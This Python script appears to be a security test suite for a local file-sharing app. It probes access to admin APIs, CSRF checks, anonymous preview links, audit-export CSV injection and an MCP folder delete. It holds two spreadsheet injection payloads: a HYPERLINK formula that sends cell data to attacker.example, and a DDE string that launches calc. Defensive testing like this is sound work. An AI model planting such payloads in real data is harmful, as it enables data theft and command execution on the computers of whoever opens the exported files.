"""Security checks behind the UI: member reaching admin data by URL/API, CSRF, preview link as bearer capability,
CSV formula injection through the audit export, MCP large-folder delete message."""
import json, os, re, urllib.request, urllib.parse, http.cookiejar
B = os.environ.get('BASE', 'http://localhost:8098')
def client():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), urllib.request.ProxyHandler({})), jar
def req(op, method, url, body=None, headers=None, form=None):
    h = dict(headers or {})
    data = None
    if form is not None: data = urllib.parse.urlencode(form).encode(); h['Content-Type'] = 'application/x-www-form-urlencoded'
    elif body is not None: data = json.dumps(body).encode(); h['Content-Type'] = 'application/json'
    r = urllib.request.Request(B + url if url.startswith('/') else url, data=data, method=method, headers=h)
    try:
        with op.open(r) as resp: return resp.status, resp.read().decode(errors='replace'), dict(resp.headers)
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors='replace'), dict(e.headers)
def login(u, p='demo-password-123'):
    op, jar = client(); s, b, _ = req(op, 'POST', '/api/auth/login', {'username': u, 'password': p}); return op, json.loads(b)['csrf']
maya, mcsrf = login('maya')
print('== member hitting admin/auditor APIs')
for u in ['/api/users', '/api/audit', '/api/storage', '/api/overview', '/api/tokens?all=true', '/api/access-check?path=/shared', '/api/directory', '/api/smb', '/api/fs/list?path=/users/jonas', '/api/routing']:
    s, b, _ = req(maya, 'GET', u); print(f'  {u:40} {s} {b[:90]!r}')
print('== CSRF')
s, b, _ = req(maya, 'POST', '/api/fs/mkdir', {'path': '/users/maya/inbox/csrf-test'}); print('  mkdir without header', s, b[:80])
s, b, _ = req(maya, 'POST', '/api/fs/mkdir', {'path': '/users/maya/inbox/csrf-test'}, {'X-CSRF-Token': 'wrong'}); print('  mkdir wrong header', s)
s, b, _ = req(maya, 'POST', '/api/fs/mkdir', {'path': '/users/maya/inbox/csrf-ok'}, {'X-CSRF-Token': mcsrf}); print('  mkdir right header', s)
s, b, _ = req(maya, 'POST', '/api/fs/upload', None, None, form={'folder': '/users/maya/inbox'}); print('  form upload w/o header', s)
op2, c2 = login('jonas')
s, b, _ = req(op2, 'POST', '/api/auth/logout'); print('  logout without CSRF header ->', s, b[:40])
s, b, _ = req(op2, 'GET', '/api/auth/me'); print('  me after header-less logout', json.loads(b)['user'])
print('== preview link as bearer capability')
s, b, _ = req(maya, 'GET', '/api/fs/meta?path=' + urllib.parse.quote('/users/maya/inbox/notes.md')); purl = json.loads(b)['preview_url']
anon, _ = client()
s, b, h = req(anon, 'GET', purl); print('  anonymous GET of preview url', s, repr(b[:30]), h.get('Content-Security-Policy', '')[:40])
req(maya, 'POST', '/api/auth/logout', None, {'X-CSRF-Token': mcsrf})
s, b, h = req(anon, 'GET', purl); print('  after maya signed out', s, repr(b[:30]))
print('== CSV formula injection via audit export')
evil = '=HYPERLINK("http://attacker.example/?"&A1,"Click")'
op3, _ = client(); s, _, _ = req(op3, 'POST', '/api/auth/login', {'username': evil, 'password': 'x' * 12}); print('  failed login with formula username', s)
adm, acsrf = login('admin', 'change-me-now-please')
s, b, _ = req(adm, 'POST', '/api/tokens', {'name': '@SUM(1+1)*cmd|"/C calc"!A0', 'scope': 'read', 'days': 1}, {'X-CSRF-Token': acsrf}); tid = json.loads(b)['id']
req(adm, 'DELETE', f'/api/tokens/{tid}', None, {'X-CSRF-Token': acsrf})
print('== MCP large folder delete')
mop, mc = login('maya')
s, b, _ = req(mop, 'POST', '/api/tokens', {'name': 'qa big', 'scope': 'write', 'days': 1}, {'X-CSRF-Token': mc}); tok = json.loads(b)['token']
def mcp(tool, **a):
    s, b, _ = req(mop, 'POST', '/mcp', {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call', 'params': {'name': tool, 'arguments': a}}, {'Authorization': 'Bearer ' + tok, 'Accept': 'application/json, text/event-stream'})
    return json.loads(b)['result']
for i in range(52): mcp('save_artifact', path=f'/users/maya/projects/bigdir/f{i}.txt', content=str(i))
r = mcp('delete', path='/users/maya/projects/bigdir'); print('  MCP delete 52-file folder ->', r.get('isError'), r['content'][0]['text'][:200])
